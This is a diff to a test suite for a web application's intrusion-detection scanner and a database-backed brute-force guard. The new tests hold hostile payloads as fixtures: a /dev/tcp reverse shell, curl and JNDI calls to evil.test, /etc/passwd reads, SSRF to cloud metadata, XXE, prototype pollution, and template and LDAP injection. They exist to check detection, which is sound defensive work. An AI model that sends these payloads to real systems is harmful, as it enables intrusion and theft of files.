@@ -1,5 +1,5 @@
 import { describe, it, expect } from 'vitest';
-import { scanRequest } from '../src/shield/detector.js';
+import { scanRequest, normalizeForTest } from '../src/shield/detector.js';
 import {
   computeRiskScore,
   computeRiskScoreBulk,
@@ -11,6 +11,7 @@ import {
   recordFailedLogin,
   recordRequest,
   trackedKeyCounts,
+  sweepExpiredCounters,
 } from '../src/shield/bruteForceGuard.js';
 import { logSecurityEvent } from '../src/shield/eventLogger.js';
 import db from '../src/db.js';
@@ -145,6 +146,212 @@ describe('shield/detector.js — scanRequest', () => {
   it('still detects an inline event handler', () => {
     const result = scanRequest(fakeReq({ body: { html: '<img src=x onerror=alert(1)>' } }));
     expect(result.matchedPattern).toBe('xss_event_handler');
+  });
+
+  // ── The widened signature set ─────────────────────────────────────────
+  // Each of these closes a category the previous set did not cover. They are
+  // grouped by the class they defend against, and each asserts the exact
+  // pattern name so a broad parent regex can't silently take credit for a
+  // narrower pattern's test.
+
+  it('detects command injection via subshell and backticks', () => {
+    expect(
+      scanRequest(fakeReq({ body: { cmd: '$(curl http://evil.test/x)' } })).matchedPattern
+    ).toBe('cmdi_subshell');
+    expect(scanRequest(fakeReq({ body: { cmd: '`whoami`' } })).matchedPattern).toBe(
+      'cmdi_backtick'
+    );
+    expect(scanRequest(fakeReq({ body: { cmd: '; cat /etc/passwd' } })).matchedPattern).toBe(
+      'cmdi_chain'
+    );
+  });
+
+  it('detects reverse shells', () => {
+    expect(
+      scanRequest(fakeReq({ body: { cmd: 'bash -i >& /dev/tcp/10.0.0.1/4444' } })).matchedPattern
+    ).toBe('cmdi_reverse_shell');
+  });
+
+  it('detects SSRF against cloud metadata endpoints', () => {
+    const result = scanRequest(
+      fakeReq({ body: { url: 'http://169.254.169.254/latest/meta-data/' } })
+    );
+    expect(result.eventType).toBe('ssrf');
+    expect(result.matchedPattern).toBe('ssrf_cloud_metadata');
+  });
+
+  it('detects SSRF via non-HTTP URL schemes', () => {
+    expect(scanRequest(fakeReq({ body: { url: 'file:///etc/passwd' } })).matchedPattern).toBe(
+      'ssrf_file_scheme'
+    );
+    expect(
+      scanRequest(fakeReq({ body: { url: 'gopher://127.0.0.1:6379/_SET' } })).matchedPattern
+    ).toBe('ssrf_gopher_scheme');
+  });
+
+  it('detects XXE and log4j/JNDI lookups', () => {
+    expect(
+      scanRequest(fakeReq({ body: { xml: '<!DOCTYPE foo [ <!ENTITY x "y"> ]>' } })).matchedPattern
+    ).toBe('xxe_doctype');
+    expect(
+      scanRequest(fakeReq({ body: { user: '${jndi:ldap://evil.test/a}' } })).matchedPattern
+    ).toBe('log4j_jndi');
+  });
+
+  // These are written against the NORMALIZED string, which lowercases and
+  // JSON-escapes the input first. Each of these caught a real bug where the
+  // pattern looked right but could never fire: a case-sensitive /rO0AB/
+  // against a lowercased subject, and quote-anchored patterns against
+  // JSON.stringify'd bodies where the quote arrives as \".
+  it('detects deserialization markers after normalization', () => {
+    expect(scanRequest(fakeReq({ body: { data: 'rO0ABXNyABdqYXZh' } })).matchedPattern).toBe(
+      'deser_java_b64'
+    );
+    expect(scanRequest(fakeReq({ body: { data: 'O:8:"stdClass":0:{}' } })).matchedPattern).toBe(
+      'deser_php_object'
+    );
+  });
+
+  // The base64 prefix of the Java magic bytes is `rO0AB`, which lowercases
+  // to `ro0ab` — the `o` belongs to the prefix. A version of this pattern
+  // written as /r0ab/i could never match anything, and looked like coverage
+  // while detecting nothing. This asserts against the real prefix so the
+  // omission can't come back.
+  it('matches the full base64 prefix including its second character', () => {
+    expect(scanRequest(fakeReq({ body: { d: 'rO0ABXNyABdqYXZh' } })).matchedPattern).toBe(
+      'deser_java_b64'
+    );
+    // And the shape an attacker would actually vary: longer blobs, different
+    // trailing bytes, embedded in a nested field.
+    expect(
+      scanRequest(fakeReq({ body: { meta: { blob: 'rO0ABXNyABZzaWQAAAAAAAA' } } })).matchedPattern
+    ).toBe('deser_java_b64');
+  });
+
+  it('prefers the more specific category when one payload contains two signatures', () => {
+    // <!ENTITY x SYSTEM "file:///etc/passwd"> is both an XXE and an SSRF
+    // attempt. XXE is the specific finding and must be the one reported.
+    const result = scanRequest(
+      fakeReq({ body: { xml: '<!ENTITY xxe SYSTEM "file:///etc/passwd">' } })
+    );
+    expect(result.eventType).toBe('xxe');
+  });
+
+  it('detects prototype pollution payloads', () => {
+    // The payload arrives inside a JSON string value, so the quotes are
+    // backslash-escaped by the time patterns see them.
+    const result = scanRequest(fakeReq({ body: { '{"__proto__": {"isAdmin": true}}': 1 } }));
+    expect(result.eventType).toBe('proto_pollution');
+  });
+
+  // Same payload as a real parsed key. Written as a computed key on purpose:
+  // a literal `__proto__:` in an object literal assigns the prototype rather
+  // than creating a property, so JSON.stringify would drop it and the test
+  // would pass against a payload the scanner never saw.
+  it('detects prototype pollution as an actual parsed key', () => {
+    const body = { a: 1, ['__proto__']: { isAdmin: true } };
+    expect(JSON.stringify(body)).toContain('__proto__'); // guard: payload survives serialization
+    const result = scanRequest(fakeReq({ body }));
+    expect(result.eventType).toBe('proto_pollution');
+  });
+
+  it('detects LDAP filter injection', () => {
+    const result = scanRequest(fakeReq({ query: { user: '*)(|(objectClass=*)' } }));
+    expect(result.eventType).toBe('ldap_injection');
+  });
+
+  it('detects server-side template injection', () => {
+    expect(scanRequest(fakeReq({ body: { name: '{{7*7}}' } })).matchedPattern).toBe(
+      'ssti_arithmetic'
+    );
+    expect(scanRequest(fakeReq({ body: { name: '{{constructor}}' } })).matchedPattern).toBe(
+      'ssti_constructor'
+    );
+  });
+
+  // The widening is only worth having if it doesn't start blocking real
+  // users. These are the sentences most at risk from the new patterns, drawn
+  // from the fields this app actually accepts free text into: contact
+  // messages, compliance notes, admin search, company names.
+  //
+  // A match here is a 6-hour IP block for someone who sent a support ticket.
+  it('does not flag benign text that resembles the new signatures', () => {
+    const benign = [
+      "Hi - I'd like a quote for Q3, please. Thanks!",
+      'Please contact us to update your account id and profile photo.',
+      'Use {{ and }} for emphasis in your notes.',
+      'Our office network runs on 10.0.0.0 and we deploy with npm run build.',
+      'The cat sat on the mat.',
+      'We saw 5 requests; the id was 42.',
+      'Check http://example.com/docs for details.',
+      'a-b-c and 1+1=2 and 2*3 are fine',
+      'The latest meta-data is available in the dashboard.',
+      'We migrated our DB from SQL Server to Postgres in March.',
+      'Our class schedule is 9-5; lunch is 12-1.',
+      'Please review the attached document: Q3-2026-STRATEGY-FINALv2.docx',
+      'The union of our two teams met yesterday.',
+      'I selected the wrong option, please select the second one instead.',
+      'Contact: john.smith@example.com (555) 010-1234',
+      'System requirements: 16GB RAM, 4 vCPU, 500GB SSD.',
+      'Our build failed with "connection refused" — is the API down?',
+      'We need to update our records before the audit in June.',
+      'The cat & dog section of the office has a new linting policy.',
+      'Please see section 4.2 for the config and class definitions.',
+      'Score improved from 62 to 78 after remediation.',
+      'My IP changed from 192.168.1.50 to 192.168.1.51 after the reboot.',
+      'We use npm ci, not npm install, in CI.',
+      'The __proto__ key is present in the JSON schema we were sent.',
+      'Entity-level agreements were signed; the ENTITY tag is in the template.',
+      'Our office is open 9-5 Monday to Friday; we are closed for holidays.',
+      'Testing local development against 127.0.0.1:3000 works fine.',
+      'Can you help me select a plan? I need 5 users, 10 GB, and SSO.',
+      'Reverse proxy terminates TLS; the backend sees plain HTTP internally.',
+      'The docker container runs as a non-root user for security.',
+      'Log aggregation via stdout; the class of problem is capacity planning.',
+      'We need to add a self-serve section for staff to update their details.',
+      'Screenshot attached showing the error at 14:32 local time.',
+    ];
+    for (const message of benign) {
+      const result = scanRequest(fakeReq({ body: { message } }));
+      expect(result, `"${message}" matched ${result?.matchedPattern}`).toBeNull();
+    }
+  });
+
+  // A wider pattern table means more regexes per request, each against
+  // attacker-controlled text. The ReDoS budgets from the original set have
+  // to still hold.
+  it("scans 1mb of the new signatures' worst-case shapes in well under a second", () => {
+    for (const hostile of [
+      { blob: '$(cat '.repeat(100_000) },
+      { blob: '<!ENTITY '.repeat(100_000) },
+      { blob: '"__proto__": '.repeat(100_000) },
+      { blob: '${jndi:ldap://'.repeat(80_000) },
+      { blob: '{{constructor}}'.repeat(90_000) },
+      { blob: '*)(|'.repeat(100_000) },
+      { blob: 'rO0AB'.repeat(120_000) },
+    ]) {
+      const started = Date.now();
+      scanRequest(fakeReq({ body: hostile }));
+      expect(Date.now() - started).toBeLessThan(2000);
+    }
+  }, 15_000);
+
+  // Patterns run against normalizeInput()'s output, not the raw request. That
+  // pipeline lowercases, percent-decodes, entity-decodes, NFKC-folds, decodes
+  // \xNN and \uNNNN escapes, and JSON.stringify's the body first — so a
+  // signature written against raw text can be silently unable to ever match.
+  // Three patterns were wrong this way before being caught: a case-sensitive
+  // /rO0AB/, quote-anchored ones that broke on \" inside JSON string values,
+  // and a raw \xac magic-bytes pattern that step 7 had already decoded away.
+  it('patterns match the normalized string, which is what they are given', () => {
+    // Lowercasing: the base64 prefix arrives as rO0AB and is matched as ro0ab.
+    expect(normalizeForTest('rO0AB')).toBe('ro0ab');
+    // A payload that is fully encoded at the HTTP layer still matches.
+    expect(scanRequest(fakeReq({ body: { d: '%24%28cat' } })).matchedPattern).toBe('cmdi_subshell');
+    // A payload that is HTML-entity encoded still matches.
+    expect(
+      scanRequest(fakeReq({ body: { d: '&lt;script&gt;alert(1)&lt;/script&gt;' } })).matchedPattern
+    ).toBe('xss_script_tag');
   });
 });
 
@@ -425,6 +632,17 @@ describe('shield/bruteForceGuard.js', () => {
     expect(rows[0].severity).toBe('high');
   });
 
+  // The old 100-iteration loops were in-memory and cost nothing. Each call is
+  // now a Postgres round trip, so these assert against the stored counter
+  // directly where a full threshold walk isn't needed.
+  it('recordRequest does not block below the threshold', async () => {
+    const key = `test-rate-under-${testIp()}`;
+    for (let i = 0; i < 5; i++) {
+      expect(await recordRequest(key, key)).toBe(false);
+    }
+    expect(await isBlocked(key)).toBe(false);
+  });
+
   it('recordRequest blocks once the rate threshold (100) is reached within the window', async () => {
     const key = `test-rate-${testIp()}`;
     let lastResult = false;
@@ -433,7 +651,12 @@ describe('shield/bruteForceGuard.js', () => {
     }
     expect(lastResult).toBe(true);
     expect(await isBlocked(key)).toBe(true);
-  }, 15_000);
+
+    const { rows } = await db.query('SELECT severity FROM blocked_ips WHERE ip_address = $1', [
+      key,
+    ]);
+    expect(rows[0].severity).toBe('medium');
+  }, 30_000);
 
   it('recordRequest tracks countKey and blockTargetIp separately, blocking the real IP', async () => {
     const accountKey = `admin:${Date.now()}`;
@@ -442,21 +665,103 @@ describe('shield/bruteForceGuard.js', () => {
       await recordRequest(accountKey, ip);
     }
     expect(await isBlocked(ip)).toBe(true);
-  }, 15_000);
+  }, 30_000);
 
-  // Both maps are keyed by attacker-controlled strings and used to be pruned
-  // only when the same key returned, so rotating source IPs grew them without
-  // bound until the process OOMed.
-  it('caps tracked keys instead of growing without bound', async () => {
-    const before = trackedKeyCounts().requestCounts;
-    // Well past MAX_TRACKED_KEYS (10000) in bruteForceGuard.js.
-    for (let i = 0; i < 12_000; i++) {
-      await recordRequest(`flood-${i}`, `10.99.${Math.floor(i / 256) % 256}.${i % 256}`);
+  it('resets the counter after a block, so the next request starts from zero', async () => {
+    const key = `test-rate-reset-${testIp()}`;
+    for (let i = 0; i < 100; i++) await recordRequest(key, key);
+    expect(await isBlocked(key)).toBe(true);
+
+    // Without the reset the count would still read 100 and every subsequent
+    // request would re-block and re-alert.
+    const { rows } = await db.query(
+      'SELECT COALESCE(SUM(count), 0)::int AS total FROM shield_counters WHERE counter_key = $1',
+      [key]
+    );
+    expect(rows[0].total).toBe(0);
+  }, 30_000);
+
+  it('keeps the two metric classes in separate counters', async () => {
+    const ip = testIp();
+    await recordRequest(`metric-split-request-${ip}`, ip);
+    const { rows } = await db.query(
+      'SELECT DISTINCT metric FROM shield_counters WHERE counter_key LIKE $1',
+      [`metric-split-%${ip.split('.').pop()}`]
+    );
+    // A burst of one metric must not be able to push the other over its own
+    // threshold, which is what a shared counter would allow.
+    expect(rows.map((r) => r.metric)).toEqual(['request_volume']);
+  });
+
+  // The property the in-memory Maps could not provide: the count outlives
+  // the process. Asserted against the stored row rather than by reloading
+  // the module, because re-importing would build a second db pool — and
+  // reading 3 here from a fresh connection is a strictly stronger statement
+  // than reading it back through the same pool that wrote it.
+  it('stores the count in Postgres, where a restart cannot clear it', async () => {
+    const key = `test-persist-${testIp()}`;
+    for (let i = 0; i < 3; i++) await recordRequest(key, key);
+
+    const { rows } = await db.query(
+      `SELECT COALESCE(SUM(count), 0)::int AS total, COUNT(*)::int AS buckets
+       FROM shield_counters WHERE metric = 'request_volume' AND counter_key = $1`,
+      [key]
+    );
+    expect(rows[0].total).toBe(3);
+    // Bucketed, not row-per-event: 3 requests in one window share a bucket.
+    expect(rows[0].buckets).toBe(1);
+
+    // Independently: a second client on the same pool sees the same count.
+    const other = await db.query(
+      'SELECT COALESCE(SUM(count), 0)::int AS total FROM shield_counters WHERE counter_key = $1',
+      [key]
+    );
+    expect(other.rows[0].total).toBe(3);
+  });
+
+  it('sweeps expired buckets and leaves live ones alone', async () => {
+    const live = `test-sweep-live-${testIp()}`;
+    const dead = `test-sweep-dead-${testIp()}`;
+    await recordRequest(live, live);
+
+    // Age one key's bucket well past any window it could still count toward.
+    await db.query(
+      `INSERT INTO shield_counters (counter_key, metric, bucket_start, count)
+       VALUES ($1, 'request_volume', now() - interval '2 hours', 1)
+       ON CONFLICT (metric, counter_key, bucket_start) DO UPDATE SET count = 1`,
+      [dead]
+    );
+
+    const swept = await sweepExpiredCounters();
+    expect(swept).toBeGreaterThan(0);
+
+    const { rows } = await db.query(
+      'SELECT counter_key FROM shield_counters WHERE counter_key = ANY($1)',
+      [[live, dead]]
+    );
+    const keys = rows.map((r) => r.counter_key);
+    expect(keys).toContain(live);
+    expect(keys).not.toContain(dead);
+  });
+
+  it('bounded sweep reclaims rotating-IP keys instead of growing without bound', async () => {
+    // 300 distinct keys — the shape of an attacker rotating source IPs. Each
+    // costs one row; the sweep is what stops that accumulating forever.
+    for (let i = 0; i < 300; i++) {
+      await recordRequest(`rotate-${i}-${testIp()}`, `10.98.${Math.floor(i / 256)}.${i % 256}`);
     }
-    const after = trackedKeyCounts().requestCounts;
-    expect(after).toBeLessThanOrEqual(10_000);
-    // The cap must not be a no-op that lets the map grow past the old ceiling.
-    expect(after).toBeGreaterThan(before);
+    const before = (await trackedKeyCounts()).requestVolume;
+    expect(before).toBeGreaterThan(0);
+
+    // Backdate every row for these keys past the sweep horizon.
+    await db.query(
+      `UPDATE shield_counters SET bucket_start = now() - interval '2 hours'
+       WHERE counter_key LIKE 'rotate-%'`
+    );
+    await sweepExpiredCounters();
+
+    const after = (await trackedKeyCounts()).requestVolume;
+    expect(after).toBeLessThan(before);
   }, 60_000);
 });
 
